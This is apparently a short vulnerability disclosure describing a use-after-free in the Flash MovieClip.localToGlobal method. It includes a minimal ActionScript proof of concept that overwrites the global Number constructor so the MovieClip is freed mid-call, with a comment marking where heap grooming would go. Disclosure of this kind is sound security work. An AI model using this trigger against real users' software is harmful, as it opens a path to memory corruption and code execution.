There is a use-after-free issue in MovieClip.localToGlobal. If the Number constructor is overwritten with a new constructor and MovieClip.localToGlobal is called with an integer parameter, the new constructor will get called. If this constructor frees the MovieClip, a use-after-free occurs. A minimal PoC is as follows:

var a = func;
_global.Number = a;
this.createEmptyMovieClip("mc", 1);
mc.localToGlobal( 7 );


function func(){

	mc.removeMovieClip();

        // fix heap here

        this.x = 2;
	this.y = 1;

	}

A sample swf and fla are attached.
